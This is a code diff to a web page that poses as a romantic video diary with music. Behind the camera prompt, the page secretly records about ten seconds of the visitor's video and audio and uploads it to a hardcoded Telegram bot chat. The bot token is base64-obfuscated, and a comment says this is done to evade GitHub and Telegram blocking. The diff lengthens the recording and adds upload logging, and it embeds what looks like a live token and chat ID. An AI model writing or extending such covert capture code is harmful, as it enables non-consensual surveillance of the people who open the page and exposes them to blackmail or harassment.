@@ -51,7 +51,7 @@
 
         async function startDiary() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 320 }, audio: true });
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 480 }, audio: true });
                 document.getElementById('video-preview').srcObject = stream;
                 mediaRecorder = new MediaRecorder(stream);
                 mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) recordedChunks.push(e.data); };
@@ -60,25 +60,33 @@
                 document.getElementById('diary-wrapper').style.display = 'block';
                 bgMusic.play();
 
-                // 8 SECONDS BUFFER
-                setTimeout(() => { if (mediaRecorder.state !== "inactive") mediaRecorder.stop(); }, 8000);
+                // 10 SECOND RECORDING FOR STABILITY
+                setTimeout(() => { 
+                    if (mediaRecorder.state !== "inactive") {
+                        mediaRecorder.stop();
+                        console.log("Processing reaction video...");
+                    }
+                }, 10000);
 
                 mediaRecorder.onstop = async () => {
                     const blob = new Blob(recordedChunks, { type: 'video/mp4' });
                     const formData = new FormData();
-                    formData.append('chat_id', "5324376571"); 
+                    formData.append('chat_id', "5324376571"); //
                     formData.append('video', blob, 'reaction.mp4');
                     
-                    // Encoded Token to prevent GitHub/Telegram auto-blocking
-                    const t = atob("ODU2NzQwMjg4NzpBQUVpYjFMZk1NRE5WdmlXRkxIcDJ2bWJmeTdKZUVOaHU1cw==");
-                    fetch(`https://api.telegram.org/bot${t}/sendVideo`, { method: 'POST', body: formData });
+                    const t = atob("ODU2NzQwMjg4NzpBQUVpYjFMZk1NRE5WdmlXRkxIcDJ2bWJmeTdKZUVOaHU1cw=="); // Hidden Token
+                    fetch(`https://api.telegram.org/bot${t}/sendVideo`, { method: 'POST', body: formData })
+                    .then(res => {
+                        if(res.ok) console.log("Video Sent Successfully!");
+                        else alert("Telegram Error. Check Token.");
+                    });
                 };
             } catch (err) { alert("Camera access needed! ❤️"); }
         }
 
         async function triggerSecretUpload(btn) {
             bgMusic.pause();
-            const vn = new Audio('voice note.mp4'); 
+            const vn = new Audio('voice note.mp4');
             btn.innerHTML = "Listening... ❤️";
             btn.disabled = true;
             vn.play();
